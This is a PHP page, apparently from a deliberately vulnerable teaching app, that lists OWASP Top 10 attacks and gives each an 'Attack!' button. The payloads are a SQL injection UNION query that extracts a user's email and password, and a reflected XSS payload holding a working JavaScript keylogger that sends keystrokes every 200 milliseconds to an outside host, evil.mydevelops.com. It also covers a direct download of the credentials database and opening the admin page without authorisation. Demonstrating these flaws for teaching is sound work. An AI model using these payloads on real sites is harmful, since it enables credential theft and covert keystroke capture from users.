<?php
include_once("init.php");

$attacks = array();

$attacks[0] = array(
    "name" => "A1 - Injection",
    "description" => "Shows email and password for a user with id 1",
    "value" => "product.php?id=0' UNION SELECT 'bla', email as name, pw as description, 'bla' FROM users WHERE id=1 --",
    "attack" => "product.php?id=0%27%20UNION%20SELECT%20%27bla%27,%20email%20as%20name,%20pw%20as%20description,%20%27bla%27%20FROM%20users%20WHERE%20id=1%20%20--");

$xss = '
var buffer = [];
var data;
var x = String(/http:\/\/evil.mydevelops.com?c=/);
attacker = x.substring(1, x.length-1);

document.onkeypress = function(e) {
    var timestamp = Date.now() | 0;
    var stroke = {
        k: e.key,
        t: timestamp
    };
    buffer.push(stroke);
};

window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker.concat(data);
        buffer = [];
    }
}, 200);
';

//$xss = trim(preg_replace('/\s\s+/', ' ', $xss));

$attacks[1] = array(
    "name" => "A3 - Cross-Site Scripting (XSS)",
    "description" => "Steals password on login site with key logger!",
    "value" => "index.php?message=&lt;script&gt;XSS-SCRIPT&lt;/script&gt;<br> XSS-SCRIPT contains javascript keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
    "attack" => "index.php?message=<script>".$xss."</script>"
);

$attacks[2] = array(
    "name" => "A5 - Security Misconfiguration",
    "description" => "Just downloads the entire SQLite Database (including users and passwords)",
    "value" => "/db/database.sqlite",
    "attack" => "/db/database.sqlite"
);

$attacks[3] = array(
    "name" => "A7 - Missing Function Level Access Control",
    "description" => "Opens the admin page as a normal user",
    "value" => "/admin.php",
    "attack" => "/admin.php"
);

?>

<?php
include_once("header.php");
?>

<div class="row listing-row">
	<div class="col s12 m10 offset-m1 ">  
		<div class="card-panel">   
			<h4>Make some nice attack</h4>  
            <table class=" highlight stripped responsive-table listing">
                <thead>
                    <tr>
                        <th>OWASP Security risk</th>
                        <th>What it does</th>
                        <th>How it does it</th>  
                    </tr>
                <tbody>
                    <?php foreach($attacks as $attack): ?>
                        <tr>
                            <td><b><?php echo $attack['name']; ?></b></td>
                            <td><?php echo $attack['description']; ?></td>
                            <td><?php echo $attack['value'];?></td>
                            <td><a class="waves-effect waves-light btn btn-small red darken-2" href="<?=$attack['attack']?>" rel="_target">Attack!</a</td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>
    
</div>   

<?php 
include_once("footer.php");
?>
